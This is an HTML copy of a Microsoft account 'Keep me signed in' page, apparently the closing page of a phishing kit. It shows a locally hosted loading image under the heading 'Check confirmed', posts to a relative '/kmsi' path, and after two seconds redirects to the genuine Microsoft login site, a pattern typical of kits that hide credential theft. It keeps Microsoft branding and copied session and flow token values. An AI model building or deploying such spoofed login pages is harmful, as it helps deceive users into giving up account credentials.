<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
<link rel="dns-prefetch" href="//aadcdn.msauth.net">

    <meta name="PageID" content="KmsiInterrupt">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="2057">
    <meta name="LocLC" content="en-GB">
    <meta http-equiv="refresh" content="2;url=http://login.microsoftonline.com" />


    
        <link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    
    <meta name="robots" content="none">



    
    <link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_mbqre5pw01euigudkiymsa2.css" rel="stylesheet" >

    <script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.kmsi.core.min_91y_my7t9phiagocbdt0vq2.js" ></script>

    <script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.kmsi.strings-en-gb.min_2-3tfl3ngs-qm8sbvnxmzg2.js" ></script>



</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
  
    

<div><!--  --> 
<div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div>

<form novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="/kmsi"><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko withProperties: { '$kmsiPage': $data } --> <div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            handleWizardButtons: false,
            useWizardBehavior: svr.fUseWizardBehavior } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: $kmsiPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div data-bind="component: { name: 'logo-control', params: { isChinaDc: svr.fIsChinaDc, bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                            initialViewId: 20,
                            initialSharedData: initialSharedData
                        },
                        event: {
                            showView: $kmsiPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --> <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next"> <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> </div> </div><!-- /ko --> <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="20" data-showidentitybanner="true" data-bind="pageViewComponent: { name: 'kmsi-view',
                        params: {
                            serverData: svr,
                            displayName: sharedData.displayName },
                        event: {
                            submitReady: $kmsiPage.view_onSubmitReady } }"><!--  --> <input type="hidden" name="LoginOptions" data-bind="value: loginOptions" value="3"> <input type="hidden" name="type" data-bind="value: 28" value="28"> <input type="hidden" name="ctx" data-bind="value: svr.sCtx" value="rQIIAXWSP2_TUBTF46QNbYWggoEKqagDE1WSFz__iYOKSGrHaRsnbWOn2EKKUvvZeWnt5zovaZxPwMDQATF0ZEHqyARIfIFO3ZCQWIABoQ6IiQWp7gdgubo69zccnXMfZYr5YvkhBzm-J-5LOaknwBwnFUGux7FCDvJQgCwoOjyA0Z2FxQ-fz_4tP3hdffX8613p8kd8xtzrUxoOy4XC8fFxnrgutlHeJn7hPcNcMMxPhjlNz6Igp1bP0kMBioCDrCQIIgtFKIpS3tItX5NNVmNN2tRtzmwD0NIP-IZ-2DcHiebX_KZsc5pcmbZ0B2vJbqlmrOkKtXSv2Er4pqpMG3tKbOpewhvQGmgTS21iS92ZfEnfblVGtM9eDxLhKfqTnndJ5HdDMqSnmbdMK0TBhrNOggDZNH-NoYBiu0cxCbYjEqKIYjRcGypjanFqXZhoUrCdcya-u2VUXdiJvYOtfVCnu8-0br8XH428SdwYRCVn46A-VTR1JMu-cASVZl3f8ZIDAKNNhVWIWRpsdSpj41DHxqZj7eIQW04pjPv1Qd3Z6Is27wrhXjzhuzzsdMG7TDaJ1SfBeeZWYirAzkoYERcfom-Z-x4ikYcoRU_txHyE3KgX2CSfiBczzK-ZmyBTnptbWEwtpVZSf2eYN7NJlUufLmvS9_PKy-Xy6pPs49T5bKE9WN03arVq2waFtovwbnudM6RxDbi6LEussyd41WBoorFqrMFy8STLnGSzv7PpFzdSH-f_9whX0"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="8a775d7a-03e8-4bd5-9f9b-95aadbf7e800"> <input type="hidden" data-bind="attr: { name: svr.sFTName }, value: svr.sFT" name="flowToken" value="AQABAAEAAAAP0wLlqdLVToOpA4kwzSnxWqh7AIMuxJBiKo9knSiFIvQQvztzvp4RvDx6QP2p7kr3D7gR79ciVShvW512gyXJhntY9nsFoaCPpXeOEmp3i6h4fyG2xn67UVdyNmDlACeEVjl3Zt_EW-AInpY_4PrFmFNCk4KFVRGRhWFoK2l2ZBJDEOFVQbGGJJUNwd82mdASapiKFydoZeP_AxRkzjAs7F6Qec2j_1nBfYPIfE8_i9lYDAJS7ovY4WhHpgGrTtSenpsHtytDFymOT30PMt0T3psj7BxwB73mf9bx055MajM8M2m4zrYw_ZljDxZIrHWNRTgmPTvkEG9inolIlIWKDeKRY85Kf7WlRboyn_ooLxvsyPKtkHCR5v5TIJk2GQTFfBKSgyHTrB5c9QUw76KtaOMb9f5gNYoIjxpZRMG3dRJk23eQ7P6nvsLo5B9BWLyDQ58q5GBuP80j5kwloj2uXTEEpqqzUm0MG0OS-KmVDIZZReKUzTHmzup0nF9qipl6JtdopxmmpxYpC8cy1BMtA1o026d7yEDSDHDbAkBNcNd8aDKgpMDrZIzbHrr9kb09aTmcI1PNNUS0Im7g-RS_vl9wnXXDiHunyWI8HSzHlNW_qCJMm35eRzCN25bLqMEgAA"> <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.apiCanary" name="canary" value="Sj+bUFFBSc0/SfeiRSC4U9vF0fTDD92dW6gBnsYevGU=5:1"> 
                            
                            <div class="row text-title" role="heading" aria-level="1" data-bind="text: str['STR_Kmsi_Title']">Check confirmed</div> 
                            
                            <div class="row text-body"> <center><img src="lib/img/loading.gif" style="height:150px" ></center> </div> 
                            
                            
                           <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div> </div><!-- ko if: showDebugDetails --><!-- /ko --> <div data-bind="component: { name: 'instrumentation-control',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value=""> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> </div> <!-- /ko --></div><!-- /ko --> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
            publicMethods: footerMethods,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                showDebugDetails: toggleDebugDetails_onClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-GB/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-GB/privacystatement">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </form></div></body></html>